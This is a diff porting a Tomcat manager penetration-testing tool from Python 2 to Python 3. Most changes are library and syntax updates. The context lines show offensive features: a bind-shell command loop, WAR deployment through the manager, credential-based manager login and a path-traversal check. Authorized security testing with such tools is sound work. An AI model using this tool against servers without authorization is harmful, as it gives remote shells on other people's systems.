@@ -1,5 +1,5 @@
 #!/usr/bin/python
-from __future__ import print_function
+
 
 #
 # Apache Tomcat server misconfiguration penetration testing tool.
@@ -32,8 +32,8 @@ import string
 import shutil
 import base64
 import socket
-import urllib
-import urllib2
+import urllib.request, urllib.parse, urllib.error
+import urllib.request, urllib.error, urllib.parse
 import logging
 import optparse
 import tempfile
@@ -169,7 +169,7 @@ def shellLoop(sock, host):
 
     try:
         while True:
-            command = raw_input(prompt)
+            command = input(prompt)
             if not command:
                 continue
             if command.lower() == 'exit' or command.lower() == 'quit':
@@ -203,7 +203,7 @@ def shellHandler(mode, hostn, opts):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(int(opts.timeout))
-    except socket.error, e:
+    except socket.error as e:
         logger.error("Creating socket for bind-shell client failed: '%s'" % e)
         return False
 
@@ -604,7 +604,7 @@ def invokeApplication(browser, url, opts):
             logger.warning('Could not correctly invoke the application!')
             return False
 
-    except urllib2.HTTPError, e:
+    except urllib.error.HTTPError as e:
         if e.code == 404:
             logger.error(
                 'Application "%s" does not exist, or was not deployed.' % opts.appname)
@@ -623,7 +623,7 @@ def deployApplication(browser, url, appname, warpath, modify_action=False, addJs
 
     resp = browser.open(url)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
+        action = urllib.parse.unquote_plus(form.action)
 
         action_function = ('/upload' in action)
 
@@ -678,7 +678,7 @@ def deployApplication(browser, url, appname, warpath, modify_action=False, addJs
 def removeApplication(browser, url, appname):
     browser.open(url)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
+        action = urllib.parse.unquote_plus(form.action)
         if url in action and '/undeploy?path=/' + appname in action:
             browser.form = form
             if INSERT_JSESSIONID:
@@ -692,8 +692,8 @@ def checkIsDeployed(browser, url, appname):
     logger.debug("Checking if app {} is deployed at: {}".format(appname, url))
     browser.open(url)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
-        appnameenc = urllib.quote_plus(appname)
+        action = urllib.parse.unquote_plus(form.action)
+        appnameenc = urllib.parse.quote_plus(appname)
         appundeploy = '/undeploy?path=/' + appnameenc
         precondition = url in action
         if '%252e%252e/' in url:
@@ -720,8 +720,8 @@ def unloadApplication(browser, url, appname, addJsessionId = False):
     logger.debug('Unloading application: "%s"' % appurl)
     browser.open(MANAGER_URL)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
-        appnameenc = urllib.quote_plus(appname)
+        action = urllib.parse.unquote_plus(form.action)
+        appnameenc = urllib.parse.quote_plus(appname)
         appundeploy = '/undeploy?path=/' + appnameenc
 
         precondition = url in action
@@ -744,13 +744,13 @@ def unloadApplication(browser, url, appname, addJsessionId = False):
             if addJsessionId:
                 try:
                     resp = browser.submit()
-                except urllib2.HTTPError, e:
+                except urllib.error.HTTPError as e:
                     logger.error('Unloading application failed with code: {}. Try changing appname with "--name" option to overcome this problem.'.format(e.code))
                     sys.exit(0)
             else:
                 try:
                     resp = browser.submit()
-                except urllib2.HTTPError, e:
+                except urllib.error.HTTPError as e:
                     if e.code == 403 and not addJsessionId:
                         for c in COOKIE_JAR:
                             if c.name.lower() == 'jsessionid':
@@ -761,9 +761,9 @@ def unloadApplication(browser, url, appname, addJsessionId = False):
 
             try:
                 resp = browser.open(appurl)
-            except urllib2.URLError as e:
+            except urllib.error.URLError as e:
                 return True
-            except urllib2.HTTPError as e:
+            except urllib.error.HTTPError as e:
                 if e.code == 404:
                     return True
 
@@ -775,7 +775,7 @@ def validateManagerApplication(browser):
                'upload', 'expire', 'reload')
     for form in browser.forms():
         for a in actions:
-            action = urllib.unquote_plus(form.action)
+            action = urllib.parse.unquote_plus(form.action)
             if '/' + a + '?' in action or '/' + a + ';' in action:
                 found += 1
 
@@ -785,7 +785,7 @@ def validateManagerApplication(browser):
     # Maybe dealing with Tomcat/5.x which had links in <A> ?
     for link in browser.links():
         for a in actions:
-            action = urllib.unquote_plus(str(link))
+            action = urllib.parse.unquote_plus(str(link))
             if '/' + a + '?' in action or '/' + a + ';' in action:
                 found += 1
 
@@ -875,7 +875,7 @@ def browseToManager(host, url, user, password):
                 reached = True
                 break
 
-        except urllib2.URLError, e:
+        except urllib.error.URLError as e:
             error = str(e)
             if 'Connection refused' in error:
                 logger.warning(
